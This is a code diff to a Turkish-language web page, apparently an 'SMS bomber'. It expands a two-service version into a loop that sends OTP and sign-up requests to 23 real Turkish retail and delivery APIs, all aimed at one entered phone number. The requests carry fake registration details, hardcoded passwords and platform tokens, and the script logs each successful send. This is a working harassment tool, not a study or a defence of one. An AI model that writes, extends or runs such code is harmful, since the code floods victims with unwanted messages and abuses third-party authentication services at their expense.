@@ -55,14 +55,12 @@
         </div>
 
         <div class="mt-8 text-center">
-            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları saklıdır.</p>
+            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları sablıdır.</p>
         </div>
 
     </div>
 
     <script>
-        let isRunning = false;
-
         function logMessage(msg, type) {
             const logConsole = document.getElementById("logConsole");
             const logRow = document.createElement("div");
@@ -79,36 +77,18 @@
             logConsole.scrollTo({ top: logConsole.scrollHeight, behavior: 'smooth' });
         }
 
-        // --- TARAYICI TABANLI API İSTEKLERİ ---
-        async function sendBim(phone) {
-            try {
-                let r = await fetch("https://bim.veesk.net/service/v1.0/account/login", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: phone })
-                });
-                if(r.status === 200) logMessage(`Başarılı! ${phone} --> bim`, "success");
-                else throw new Error();
-            } catch { logMessage(`Başarısız! ${phone} --> bim`, "fail"); }
-        }
-
-        async function sendKahveDunyasi(phone) {
-            try {
-                let r = await fetch("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ countryCode: "90", phoneNumber: phone })
-                });
-                let json = await r.json();
-                if(json.processStatus === "Success") logMessage(`Başarılı! ${phone} --> kahvedunyasi`, "success");
-                else throw new Error();
-            } catch { logMessage(`Başarısız! ${phone} --> kahvedunyasi`, "fail"); }
+        function generateRandomData() {
+            let letters = 'abcdefghijklmnopqrstuvwxyz';
+            let mail = '';
+            for (let i = 0; i < 22; i++) mail += letters.charAt(Math.floor(Math.random() * letters.length));
+            return mail + "@gmail.com";
         }
 
         async function startProcess() {
             const phoneInput = document.getElementById("phoneInput");
             const startBtn = document.getElementById("startBtn");
             const monitorArea = document.getElementById("monitorArea");
+            const logConsole = document.getElementById("logConsole");
             const loader = document.getElementById("loader");
 
             if (phoneInput.value.length !== 10) {
@@ -119,15 +99,172 @@
             phoneInput.disabled = true;
             startBtn.disabled = true;
             startBtn.classList.add("opacity-50", "cursor-not-allowed");
+            logConsole.innerHTML = "";
             monitorArea.classList.remove("hidden");
+            loader.innerText = "İstekler gönderiliyor...";
+            loader.className = "text-[11px] text-zinc-500 font-medium animate-pulse";
 
             const phone = phoneInput.value;
+            const mail = generateRandomData();
 
-            // Sırayla istekleri tarayıcıdan gönderiyoruz
-            await sendBim(phone);
-            await sendKahveDunyasi(phone);
+            // Tüm 24 API Servis Tanımlamaları
+            const services = [
+                {
+                    name: "kahvedunyasi",
+                    url: "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ countryCode: "90", phoneNumber: phone }) },
+                    check: async (r) => { let j = await r.json(); return j.processStatus === "Success"; }
+                },
+                {
+                    name: "wmf",
+                    url: "https://www.wmf.com.tr/users/register/",
+                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `confirm=true&date_of_birth=1956-03-01&email=${encodeURIComponent(mail)}&email_allowed=true&first_name=Memati&gender=male&last_name=Bas&password=31ABC..abc31&phone=0${phone}` },
+                    check: async (r) => r.status === 202
+                },
+                {
+                    name: "bim",
+                    url: "https://bim.veesk.net/service/v1.0/account/login",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone: phone }) },
+                    check: async (r) => r.status === 200
+                },
+                {
+                    name: "englishhome",
+                    url: "https://www.englishhome.com/api/member/sendOtp",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ Phone: phone, XID: "" }) },
+                    check: async (r) => { let j = await r.json(); return j.isError === false; }
+                },
+                {
+                    name: "suiste",
+                    url: "https://suiste.com/api/auth/code",
+                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `action=register&gsm=${phone}&full_name=Memati+Bas&password=31MeMaTi31` },
+                    check: async (r) => { let j = await r.json(); return j.code === "common.success"; }
+                },
+                {
+                    name: "kimgb",
+                    url: "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ msisdn: `90${phone}` }) },
+                    check: async (r) => r.status === 200
+                },
+                {
+                    name: "evidea",
+                    url: "https://www.evidea.com/users/register/",
+                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `first_name=Memati&last_name=Bas&email=${encodeURIComponent(mail)}&phone=0${phone}&password=31ABC..abc31&confirm=true&sms_allowed=true` },
+                    check: async (r) => r.status === 202
+                },
+                {
+                    name: "ucdortbes",
+                    url: "https://api.345dijital.com/api/users/register",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: "", name: "Memati", trackingNumber: `+90${phone}`, surname: "Bas" }) },
+                    check: async (r) => { let j = await r.json(); return j.error !== "E-Posta veya telefon zaten kayıtlı!"; }
+                },
+                {
+                    name: "tiklagelsin",
+                    url: "https://svc.apps.tiklagelsin.com/user/graphql",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ operationName: "GENERATE_OTP", query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", variables: { challenge: "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", deviceUniqueId: "720932D5-47BD-46CD-A4B8-086EC49F81AB", phone: `+90${phone}` } }) },
+                    check: async (r) => { let j = await r.json(); return j.data?.generateOtp === true; }
+                },
+                {
+                    name: "naosstars",
+                    url: "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ telephone: `+90${phone}`, type: "register" }) },
+                    check: async (r) => r.status === 200
+                },
+                {
+                    name: "koton",
+                    url: "https://www.koton.com/users/register/",
+                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `first_name=Memati&last_name=Bas&email=${encodeURIComponent(mail)}&password=31ABC..abc31&phone=0${phone}&confirm=true&sms_allowed=true` },
+                    check: async (r) => r.status === 202
+                },
+                {
+                    name: "hayatsu",
+                    url: "https://api.hayatsu.com.tr/api/SignUp/SendOtp",
+                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `mobilePhoneNumber=${phone}&actionType=register` },
+                    check: async (r) => { let j = await r.json(); return j.is_success === true; }
+                },
+                {
+                    name: "hizliecza",
+                    url: "https://prod.hizliecza.net/mobil/account/sendOTP",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ otpOperationType: 1, phoneNumber: `+90${phone}` }) },
+                    check: async (r) => r.status === 200
+                },
+                {
+                    name: "metro",
+                    url: "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ methodType: "2", mobilePhoneNumber: phone }) },
+                    check: async (r) => { let j = await r.json(); return j.status === "success"; }
+                },
+                {
+                    name: "file",
+                    url: "https://api.filemarket.com.tr/v1/otp/send",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ mobilePhoneNumber: `90${phone}` }) },
+                    check: async (r) => { let j = await r.json(); return j.responseType === "SUCCESS"; }
+                },
+                {
+                    name: "akasya",
+                    url: "https://akasyaapi.poilabs.com/v1/en/sms",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5" }, body: JSON.stringify({ phone: phone }) },
+                    check: async (r) => { let j = await r.json(); return j.result === "SMS sended succesfully!"; }
+                },
+                {
+                    name: "akbati",
+                    url: "https://akbatiapi.poilabs.com/v1/en/sms",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3" }, body: JSON.stringify({ phone: phone }) },
+                    check: async (r) => { let j = await r.json(); return j.result === "SMS sended succesfully!"; }
+                },
+                {
+                    name: "komagene",
+                    url: "https://gateway.komagene.com.tr/auth/auth/smskodugonder",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json", "Firmaid": "32" }, body: JSON.stringify({ FirmaId: 32, Telefon: phone }) },
+                    check: async (r) => { let j = await r.json(); return j.Success === true; }
+                },
+                {
+                    name: "porty",
+                    url: "https://panel.porty.tech/api.php?",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ job: "start_login", phone: phone }) },
+                    check: async (r) => { let j = await r.json(); return j.status === "success"; }
+                },
+                {
+                    name: "tasdelen",
+                    url: "https://tasdelen.sufirmam.com:3300/mobile/send-otp",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone: phone }) },
+                    check: async (r) => { let j = await r.json(); return j.result === true; }
+                },
+                {
+                    name: "uysal",
+                    url: "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone_number: phone }) },
+                    check: async (r) => r.status === 200
+                },
+                {
+                    name: "yapp",
+                    url: "https://yapp.com.tr/api/mobile/v1/register",
+                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ app_version: "1.1.5", phone_number: phone, firstname: "Memati", lastname: "Bas", email: mail }) },
+                    check: async (r) => r.status === 200
+                },
+                {
+                    name: "yilmazticaret",
+                    url: "https://app.buyursungelsin.com/api/customer/form/checkx",
+                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `fonksiyon=customer%2Fform%2Fcheckx&method=POST&telephone=0${phone}` },
+                    check: async (r) => r.status === 200
+                }
+            ];
 
-            // İşlem bittiğinde arayüzü güncelle
+            // İstekleri 400ms aralıklarla sırayla tetikle
+            for (let svc of services) {
+                try {
+                    let response = await fetch(svc.url, { ...svc.opts, mode: 'cors' });
+                    let isSuccess = await svc.check(response);
+                    if (isSuccess) {
+                        logMessage(`Başarılı! ${phone} --> ${svc.name}`, "success");
+                    } else {
+                        logMessage(`Başarısız! ${phone} --> ${svc.name}`, "fail");
+                    }
+                } catch (e) {
+                    logMessage(`Başarısız! ${phone} --> ${svc.name}`, "fail");
+                }
+                await new Promise(resolve => setTimeout(resolve, 400));
+            }
+
             loader.innerText = "Tamamlandı";
             loader.classList.remove("animate-pulse");
             loader.classList.add("text-emerald-400");
